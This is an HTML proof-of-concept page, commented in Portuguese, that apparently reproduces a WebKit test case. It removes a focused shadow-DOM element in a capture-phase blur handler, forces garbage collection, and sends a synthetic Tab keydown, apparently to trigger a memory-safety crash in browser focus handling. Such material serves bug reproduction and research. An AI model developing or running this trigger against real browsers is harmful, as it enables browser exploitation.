<!DOCTYPE html>
<html>
<body>
<button id="startButton" style="padding: 10px 20px; font-size: 16px; cursor: pointer;">Iniciar Teste</button>
<br><br>
<div id="host"></div>

<script>
function gc() {
    function gcRec(n) {
        if (n < 1) return {};
        var temp = { i: "ab" + i + (i / 100000) };
        temp += "foo";
        gcRec(n - 1);
    }
    for (var i = 0; i < 10000; i++) gcRec(10);  
}

// 1. Elementos criados previamente idênticos ao teste original do WebKit
let host = document.getElementById('host');
let shadowRoot = host.attachShadow({ mode: 'open' });
let victim = document.createElement('div');
victim.tabIndex = 0;
victim.textContent = 'Focusable'; // Texto original do commit

// Estilo visual para simular uma caixinha contornada na tela
victim.style.border = '1px solid #ccc';
victim.style.padding = '8px 12px';
victim.style.display = 'inline-block';
victim.style.fontFamily = 'monospace';

shadowRoot.appendChild(victim);

// 2. Listener de blur preparado na fase de captura
document.addEventListener('blur', (e) => {
    if (victim) {
        victim.remove();
        victim = null;
    }
    gc();
}, { capture: true, once: true });

// 3. O botão atua como o gatilho validado por gesto do usuário
document.getElementById('startButton').addEventListener('click', () => {
    if (victim) {
        victim.focus();
        
        setTimeout(() => {
            if (victim) {
                victim.dispatchEvent(new KeyboardEvent('keydown', {
                    bubbles: true,
                    cancelable: true,
                    view: window,
                    key: 'Tab',
                    code: 'Tab',
                    keyCode: 9
                }));
            }
        }, 50);
    }
});
</script>
</body>
</html>
